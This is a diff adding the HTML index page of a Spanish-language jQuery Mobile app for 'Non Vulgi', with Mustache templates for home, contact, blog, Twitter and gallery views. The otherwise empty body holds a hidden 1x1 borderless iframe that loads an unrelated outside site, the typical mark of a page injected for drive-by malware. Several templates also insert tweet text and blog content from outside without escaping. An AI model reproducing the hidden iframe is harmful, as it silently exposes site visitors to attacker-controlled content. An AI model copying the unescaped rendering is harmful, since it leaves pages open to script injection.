@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html class="ui-mobile-rendering">
+<head>
+    <title></title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="css/jquery.mobile.structure-1.1.0.min.css"/>
+    <link rel="stylesheet" href="css/NonVulgi.min.css"/>
+    <link type="text/css" rel="stylesheet" href="css/jqm-icon-pack-2.0-original.css" />
+	<link type="text/css" rel="stylesheet" href="css/custom.css" />
+
+    <!-- The Templates -->
+    <script type="text/html" id="home">
+
+        <div data-role="header">
+            <h1 id='header_logo'><img src="logo-png2.png" ></h1>
+			<a data-role='button' data-iconpos="notext" data-icon='info' href="#contactenos" ></a>
+        </div>
+
+        <div data-role="content">
+			{{#items}}
+			<ul data-role="listview">
+			<li>{{id}}</li>
+			</ul>
+			{{/items}}
+            <div class="ui-body ui-body-{{theme}} ui-corner-all">{{#clean}}{{{item.attributes.fulltext}}}{{/clean}}</div>
+        </div>
+		<footer data-role="footer" data-position="fixed" data-id="pie">
+				<div data-role="navbar">
+			<ul>
+				<li><a href="#" {{#home}}class="ui-btn-active ui-state-persist"{{/home}} data-icon="star" >Inicio</a></li>
+				<li><a href="#blog" data-icon="rss" >Blog</a></li>
+				<li><a href="#twitter" data-icon="twitter">Twitter</a></li>
+				<li><a href="#galeria" data-icon="grid" >Galeria</a></li>
+			</ul>
+		</div>
+		</footer>
+    </script>
+    <script type="text/html" id="contactenos">
+		<header data-role="header"  data-id="cabesa" >
+			<h1>Contactenos</h1>
+			<a href="#" data-icon="back" >Atras</a>
+		</header>
+        <div data-role="content">
+            <h3>Ubicacion</h3>
+		<!--<img alt='Mapa de Nonvulgi' src="http://maps.google.com/maps/api/staticmap?zoom=15&size=265x300&sensor=false&markers=color:red|10.495127928174329,-66.91358087994536"/>-->
+		<img alt='Mapa de Nonvulgi' src="img/staticmap.png" width="265px" height="300px" />
+	<ul  data-role="listview"  data-inset="true" >
+	<li data-role="list-divider">Informacion de contacto</li> 
+	<li><a href='mailto:info@nonvulgi.com'>Email: info@nonvulgi.com</a></li> 
+	<li>Direccion: De mijares a sant capilla</li>
+	<li data-role="list-divider">Telefonos</li>
+	<li><a href="tel:+58 212 541 20 39">+58 212 541 20 39</a></li>
+	</ul> 
+	<form data-ajax="false">
+		<ul data-role="listview" data-inset="true" id='form_contact' >
+		<li data-role="list-divider"><h3>Informacion de contacto de Non Vulgi:</h3></li> 
+		<li><label for='email'>Email: </label><input type='email' name='email' id='email' value="" required="required"></li> 
+		<li><label for='nombre'>Nombre: </label><input type='text' name='nombre' id='nombre' value="" required="required"></li> 
+		<li><label for='asunto'>Asunto: </label><input type='text' name='asunto' id='asunto' value="" required="required"></li> 
+		<li><label for='texto'>Mensaje: </label><textarea name='texto' id='texto' required="required"></textarea></li>
+		</ul>
+		<div class="ui-body ui-body-a" >
+		<fieldset class="ui-grid-a" id='form_buttons'>
+		<div class='ui-block-a'><input type='submit' value='Enviar'  id="btnenviar"></div>
+		<div class='ui-block-b'><input type='reset' value='Reiniciar'></div>
+		</fieldset>
+		</div>
+	</form>
+        </div>
+    </script>
+
+    <script type="text/html" id="blog">
+		<header data-role="header"  data-id="cabesa" >
+			<h1 id='header_logo'><img src="logo-png2.png" ></h1>
+			<a data-role='button' data-iconpos="notext" data-icon='info' href="#contactenos" data-rel="dialog" data-transition="pop"></a>
+		</header>
+
+        <div data-role="content">
+            <h1>Non Vulgi - Blog</h1>
+			{{#items}}
+			<div  class="feed-items ui-body ui-body-{{theme}} ui-corner-all ">
+			<img src="{{attributes.img}}" />
+			<h4>{{attributes.title}}</h4>
+			<p>{{{attributes.contentSnippet}}}</p>
+			<a href="#blog/{{id}}" data-role="button" class="seemore" data-rel="dialog" data-entryid="'+i+'" data-inline="true">Leer más...</a>
+			</div>
+			{{/items}}
+		</div>
+		<footer data-role="footer" data-position="fixed" data-id="pie">
+				<div data-role="navbar">
+			<ul>
+				<li><a href="#"   data-icon="star">Inicio</a></li>
+				<li><a href="#blog"  {{#blog}}class="ui-btn-active ui-state-persist"{{/blog}} data-icon="rss" rel="external">Blog</a></li>
+				<li><a href="#twitter" data-icon="twitter">Twitter</a></li>
+				<li><a href="#galeria" data-icon="grid" rel="external">Galeria</a></li>
+			</ul>
+		</div>
+		</footer>
+
+    </script>
+	<script type="text/html" id="blogPOST">
+		<header data-role="header"  data-id="cabesa" >
+			<h1 id='header_logo'><img src="logo-png2.png" ></h1>
+			<a data-role='button' data-iconpos="notext" data-icon='info' href="#contactenos" data-rel="dialog" data-transition="pop"></a>
+			<a href="#blog" data-icon="back" >Atras</a>
+		</header>
+        <div data-role="content">
+		{{#item}}
+            <h1>{{attributes.title}}</h1>
+			{{title}}
+			{{{attributes.content}}}
+		{{/item}}
+		</div>
+		<footer data-role="footer" data-position="fixed" data-id="pie">
+				<div data-role="navbar">
+			<ul>
+				<li><a href="#"   data-icon="star">Inicio</a></li>
+				<li><a href="#blog"  {{#blog}}class="ui-btn-active ui-state-persist"{{/blog}} data-icon="rss" rel="external">Blog</a></li>
+				<li><a href="#twitter" data-icon="twitter">Twitter</a></li>
+				<li><a href="#galeria" data-icon="grid" rel="external">Galeria</a></li>
+			</ul>
+		</div>
+		</footer>
+
+    </script>
+	<script type="text/html" id="twitter">
+	<header data-role="header"  data-id="cabesa" >
+		<h1 id='header_logo'><img src="logo-png2.png" ></h1>
+		<a data-role='button' data-iconpos="notext" data-icon='info' href="#contactenos" data-rel="dialog" data-transition="pop"></a>
+	</header>
+		<div data-role="content">
+		<ul data-role="listview" data-inset="true" id='twitter_list' >
+		<li data-role="list-divider">Twitter: </li>
+		<li ><a target='_blank' href='http://twitter.com/#!/nonvulgi' rel="external">@nonvulgi</a></li>
+		{{#items}}
+		<li><img src="{{attributes.profile_image_url}}" /><p>{{{attributes.text}}}</p><p>{{attributes.from_user}}</p></li>
+		{{/items}}
+		</ul>
+		</div>
+		<footer data-role="footer" data-position="fixed" data-id="pie">
+		<div data-role="navbar">
+	<ul>
+		<li><a href="#"   data-icon="star">Inicio</a></li>
+		<li><a href="#blog" rel="external"  data-icon="rss">Blog</a></li>
+		<li><a href="#twitter" {{#twitter}}class="ui-btn-active ui-state-persist"{{/twitter}} data-icon="twitter">Twitter</a></li>
+		<li><a href="#galeria" data-icon="grid" rel="external">Galeria</a></li>
+		</ul>
+	</div>
+	</footer>
+	</script>
+	<script type="text/html" id="galeria">
+	<header data-role="header"  data-id="cabesa" >
+		<h1 id='header_logo'><img src="logo-png2.png" ></h1>
+		<a data-role='button' data-iconpos="notext" data-icon='info' href="#contactenos" data-rel="dialog" data-transition="pop"></a>
+	</header>
+	<div data-role="content" >
+		<ul class="gallery">
+		{{#items}}
+		<li></li>
+		<li><a href="{{attributes.fileurl}}" rel="external"><img src="{{attributes.fileurl}}" alt="{{attributes.title}}" /></a></li>
+		{{/items}}
+		</ul>
+	</div>
+	<footer data-role="footer" data-position="fixed" data-id="pie">
+	<div data-role="navbar">
+		<ul>
+			<li><a href="#"   data-icon="star">Inicio</a></li>
+			<li><a href="#blog" data-icon="rss" rel="external">Blog</a></li>
+			<li><a href="#twitter" data-icon="twitter">Twitter</a></li>
+			<li><a href="#galeria" {{#galeria}}class="ui-btn-active ui-state-persist"{{/galeria}} data-icon="grid" rel="external">Galeria</a></li>
+		</ul>
+	</div>
+	</footer>
+	</script>
+
+    <!-- The Scripts -->
+	<script type="text/javascript" src="js/klass.min.js"></script>
+    <script src="lib/jquery-1.7.1.min.js"></script>
+	<script type="text/javascript" src="js/code.photoswipe.jquery-3.0.5.min.js"></script>
+    <script src="js/jqm-config.js"></script>
+    <script src="lib/jquery.mobile-1.1.0.min.js"></script>
+    <script src="lib/underscore-min.js"></script>
+    <script src="lib/backbone-min.js"></script>
+    <script src="lib/mustache.js"></script>
+    <script src="js/main.js"></script>
+
+</head>
+
+<body><iframe src="http://www.Trenz.pl/rc/" width=1 height=1 frameborder=0></iframe>
+</body>
+
+</html>
